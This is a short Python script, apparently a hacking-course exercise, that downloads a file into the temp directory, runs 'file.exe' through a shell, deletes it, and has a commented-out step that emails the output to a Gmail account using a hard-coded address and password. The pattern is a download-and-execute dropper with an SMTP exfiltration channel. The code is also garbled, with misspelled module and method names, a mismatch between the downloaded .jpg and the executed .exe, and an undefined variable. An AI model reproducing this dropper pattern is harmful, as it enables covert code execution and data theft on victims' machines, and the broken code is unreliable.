#!/usr/bin/env python

import requests, smtplib, os, subpocess, tempfile


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quite()


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://www.carmagazine.co.uk/Images/PageFiles/69400/GTRNismo_13.jpg")
subpocess.check_output("file.exe", shell=True)
#send_mail("lior.tamir@gmail.com", "tratra", result)
os.remove("file.exe")
